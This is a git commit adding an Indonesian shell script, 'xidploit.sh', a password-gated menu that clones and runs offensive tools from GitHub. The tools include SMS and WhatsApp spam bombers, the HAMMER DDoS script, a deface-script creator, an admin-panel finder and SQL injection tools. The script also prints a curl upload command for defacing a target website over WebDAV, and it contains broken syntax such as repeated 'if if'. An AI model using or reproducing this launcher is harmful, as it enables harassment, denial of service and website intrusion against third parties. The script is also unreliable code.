7ce64f5293c259f41322f553f04a52d1e3aa1a44
Mr_XiD <44462886+safri1234@users.noreply.github.com>
2019-01-06 18:41:03 +0700

    Create xidploit.sh

---
+++ xidploit.sh
@@ -0,0 +1,407 @@
+mau reqod hubungi pemilik toola
+#wa :083851312460
+#update 6 January 2019
+
+clear
+echo "starting tools... /";
+sleep 0.1;
+clear
+echo 'Starting tools... -';
+sleep 0.1;
+clear
+echo 'sTarting tools... \';
+sleep 0.1;
+clear
+echo "stArting tools... /";
+sleep 0.1;
+clear
+echo 'staRting tools... -';
+sleep 0.1;
+clear
+echo 'starTing tools... \';
+sleep 0.1;
+clear
+echo "startIng tools... /";
+sleep 0.1;
+clear
+echo "startiNg tools... -";
+sleep 0.1;
+clear
+echo 'startinG tools... \';
+sleep 0.1;
+clear
+echo 'starting Tools... -';
+sleep 0.1;
+clear
+echo "starting tOols... /";
+sleep 0.1;
+clear
+echo 'starting toOls... -';
+sleep 0.1;
+clear
+echo 'starting tooLs... \';
+sleep 0.1;
+clear
+echo "starting toolS... /";
+sleep 0.1;
+clear
+echo "starting tools... /";
+sleep 0.1;
+clear
+echo 'Starting tools... -';
+sleep 0.1;
+clear
+echo 'sTarting tools... \';
+sleep 0.1;
+clear
+echo "stArting tools... /";
+sleep 0.1;
+clear
+echo 'staRting tools... -';
+sleep 0.1;
+clear
+echo 'starTing tools... \';
+sleep 0.1;
+clear
+echo "startIng tools... /";
+sleep 0.1;
+clear
+echo "startiNg tools... -";
+sleep 0.1;
+clear
+echo 'startinG tools... \';
+sleep 0.1;
+clear
+echo 'starting Tools... -';
+sleep 0.1;
+clear
+echo "starting tOols... /";
+sleep 0.1;
+clear
+echo 'starting toOls... -';
+sleep 0.1;
+clear
+echo 'starting tooLs... \';
+sleep 0.1;
+clear
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+clear
+toilet -f big -F gay "LOGIN TOOL"
+echo ""
+echo $green"MASUKAN USERNAME"
+echo $green"Whatsapp : 083851312460 Jika usr salah"
+echo ""
+echo $green"USR NAME"
+read -p"Masukan Username: " us
+if [ $us = "xidploit" ];then
+sleep 1
+clear
+else
+clear
+toilet -f big -F gay "Salah"
+toilet -f big -F gay "bos"
+sleep 1
+clear
+sh pw+us.sh
+fi
+
+toilet -f big -F gay "LOGIN TOOL"
+echo ""
+echo $green"Masukan paswordnya bro"
+echo $green"Whastapp : 083851312460 jika pasword salah"
+echo ""
+echo $red"PASWORD"
+read -p"Masukan Password: " pw
+if [ $pw = "ownerxid" ];then
+sleep 1
+clear
+else
+clear
+toilet -f big -F gay "salah"
+toilet -f big -F gay "bos"
+sleep 1
+clear
+sh pw+us.sh
+fi
+
+figlet SELAMAT DATANG  | lolcat
+ 
+clear
+echo "tunggu sebentar... /";
+sleep 0.1;
+clear
+echo 'Tunggu sebentar... -';
+sleep 0.1;
+clear
+echo 'tUnggu sebentar... \';
+sleep 0.1;
+clear
+echo "tuNggu sebentar... /";
+sleep 0.1;
+clear
+echo 'tunGgu sebentar... -';
+sleep 0.1;
+clear
+echo 'tungGu sebentar... \';
+sleep 0.1;
+clear
+echo "tunggU sebentar... /";
+sleep 0.1;
+clear
+echo "tunggu Sebentar... -";
+sleep 0.1;
+clear
+echo 'tunggu sEbentar... \';
+sleep 0.1;
+clear
+echo 'tunggu seBentar... -';
+sleep 0.1;
+clear
+echo "tunggu sebEntar... /";
+sleep 0.1;
+clear
+echo 'tunggu sebeNtar... -';
+sleep 0.1;
+clear
+echo 'tunggu sebenTar... \';
+sleep 0.1;
+clear
+echo "tunggu sebentAr... /";
+sleep 0.1;
+clear
+sleep 2
+
+figlet MR_XID  | lolcat
+sleep 2
+ 
+echo                      " [•]===><===<>===><===<>===><===<>==><==[]"|lolcat
+echo                      " [•]Author   :  MR_XiD                  []"|lolcat
+echo                      " [•]Wa       :  083851312460            []"|lolcat
+echo                      " [•]thanks to: I T A                    []"|lolcat
+echo                      " [•]Thansk to: L4EFY                    []"|lolcat
+echo                      " [•]thanks to: D35TR0Y SQUAD            []"|lolcat
+echo                      " [•]Note2    : Copyright©MR_XID 2018    []"
+echo                      " [•]===><==<>===><===<>===><===<>===><==[]"|lolcat
+
+echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>" | lolcat
+echo    " (1. Info tool "
+echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>" | lolcat
+echo    " (2. BOM SPAM "   
+echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>" | lolcat
+echo    " (3. HAMMER DDOS "
+echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>"|lolcat
+echo    " (4. SQL MAP"
+echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>"|lolcat
+echo    " (5. SPAM WHATSAPP"
+echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>"|lolcat
+echo    " (6. New Tool TUAN B4DUT "
+echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>"|lolcat
+echo    " (7. Tool TUAN B4DUT V3"
+echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>"|lolcat
+echo    " (8. TOOL Cyb3r gh0st "
+echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>"|lolcat
+echo    " (9. TOOL TU4N N1CKN4M3"
+echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>"|lolcat
+echo    " (10.MAKE SCRIP DEFACE "
+echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>"|lolcat
+echo    " (11.WEB HACK "
+echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>"|lolcat
+read -p "(pilih nomornya>" sf;
+
+if [ $sf = 1 ] || [ $sf = 1 ]
+then
+echo    "==========================="|lolcat
+echo    " 1. info tools "
+echo    "==========================="|lolcat
+echo    " 2. selengkapnya"
+echo    "===========================" | lolcat
+echo    " 3. blog tutorial"
+echo    "===========================" | lolcat
+echo    "╭─[>•<]"
+read -p "╰─root@./MR_XID=" fri;
+fi
+if [ $fri = 1 ] || [ $fri = 1 ]
+then
+echo "-gunakan tool saya dengan benar-" | lolcat
+sleep 1
+echo "autor by MR_XID 2018 "
+echo " thansk to "
+echo "JATIM BLACKHAT " | lolcat
+echo "D35TR0Y SQUAD" | lolcat
+echo "I T A " | lolcat
+echo "L4EFY " | lolcat
+echo "ELITE MUSLIM CYBER ARMY " | lolcat
+sleep 1
+fi 
+if [ $fri = 2 ] || [ $fri = 2 ]
+then 
+echo " itu aja bos  tunggu update tools nya lagi "
+fi 
+if [ $fri = 3 ] || [ $fri = 3 ]
+then
+echo " copas link di bawah ini " | lolcat
+echo "http://destroysquad.blogspot.com "
+fi
+if [ $sf = 2 ] || [ $sf = 2 ]
+then 
+clear 
+git clone https://github.com/4L13199/LITESPAM
+cd LITESPAM
+sleep 1
+sh LITESPAM.sh
+echo "langsung santet mantan :v" | lolcat
+fi
+if [ $sf = 3 ] || [ $sf = 3 ]
+then 
+clear
+git clone https://github.com/cyweb/hammer 
+cd hammer 
+chmod 7777 hammer.py
+sleep 1
+python hammer.py 
+fi
+if [ $sf = 4 ] || [ $sf = 4 ]
+then 
+clear
+git clone https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap
+python2 sqlmap.py
+echo "terinstall bos " | lolcat
+fi 
+if [ $sf = 5 ] || [ $sf = 5 ]
+then 
+clear
+Pkg update && pkg upgrade
+pkg install python2
+pkg install git
+git clone https://github.com/siputra12/prank
+cd prank
+pkg install php
+sleep 1
+php wa.php
+echo "terinstall cokkk "|lolcat
+fi
+if [ $sf = 6 ] || [ $sf = 6 ]
+then 
+clear
+apt upgrade && apt update
+pkg install git lolcat
+git clone https://github.com/TUANB4DUT/DIR
+cd DIR
+chmod 777 dir.sh
+./dir.sh
+echo "tidak semua website bisa " | lolcat
+fi 
+if [ $sf = 7 ] || [ $sf = 7 ]
+then 
+clear
+pkg install python python2 vim figlet curl
+pkg install php 
+pip2 install lolcat 
+pkg install git 
+git clone https://github.com/TUANB4DUT/TOOLSINSTALLERv3
+cd TOOLSINSTALLERv3
+sleep 1
+sh TUANB4DUT.sh
+fi
+if [ $sf = 8 ] || [ $sf = 8 ]
+then 
+clear
+pkg update && pkg upgrade -y
+pkg install figlet
+pkg install php
+pkg install python python2 vim figlet curl
+pip2 install lolcat
+pkg install git
+git clone https://github.com/cyberghost69/bima-bagus-jabang-v3
+cd bima-bagus-jabang-v3
+sh bima-bagus-jabang-v3.sh
+fi 
+if [ $sf = 9 ] || [ $sf = 9 ]
+then 
+clear
+apt update && apt upgrade -y
+git clone https://github.com/TU4NN1CKN4M3/TOOLSv2
+cd TOOLSv2
+sh TU4NN1CKN4M3.sh
+fi 
+if [ $sf = 10 ] || [ $sf = 10 ]
+then 
+clear 
+pkg update && pkg upgrade -y
+pkg install python2
+git clone https://github.com/Ubaii/script-deface-creator
+cd script-deface-creator
+chmod +x create.py
+python2 create.py
+fi 
+if [ $sf = 11 ] || [ $sf = 11 ]
+then 
+echo    "==========================="|lolcat
+echo    " 1. admin-panel-finder "
+echo    "==========================="|lolcat
+echo    " 2. sqlmap"
+echo    "===========================" | lolcat
+echo    " 3. Nmap"
+echo    "===========================" | lolcat
+echo    " 4. Webdav Mass Exploit"
+echo    "===========================" | lolcat
+echo    " 5. Websploit"
+echo    "==========================="|lolcat
+echo    " 00. back"
+echo    "==========================="|lolcat
+echo    "╭─[web hack]"
+read -p "╰─root@./MR_XID=" ga;
+if [ $ga = 1 ] || [ $ga = 1 ]
+then 
+clear 
+apt update && apt upgrade -y
+pkg install git
+git clone https://github.com/bdblackhat/admin-panel-finder.git
+cd admin-panel-finder
+python2 admin_panel_finder.py
+fi 
+if [ $ga = 2 ] || [ $ga = 2 ]
+then 
+clear 
+pkg install python2
+git clone https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap
+python2 sqlimap.py
+fi 
+if [ $ga = 3 ] || [ $ga = 3 ]
+then 
+clear
+apt update && apt upgrade -y
+apt install nmap
+fi 
+if if [ $ga = 4 ] || [ $ga = 4 ]
+then 
+clear 
+apt update && apt upgrade
+pkg install curl
+echo "jika sudah install curl selanjutnya" 
+echo "curl -T /storage/emulated/0/index.html http://webtarget.com [enter ]"
+echo "copas code di atas dengan isi web target dan sc harus bernama index html. dan tarus ke luar forder internal"
+fi 
+if if [ $ga = 5 ] || [ $ga = 5 ]
+then 
+clear
+pkg install python2
+pkg install git -y
+git clone https://github.com/blackvkng/viSQL
+cd viSQL
+chmod 777 viSQL.py
+python2 viSQL.py
+fi 
+if if [ $ga = 00 ] || [ $ga = 00 ]
+then 
+sh Xidploit.sh
+exit
+fi
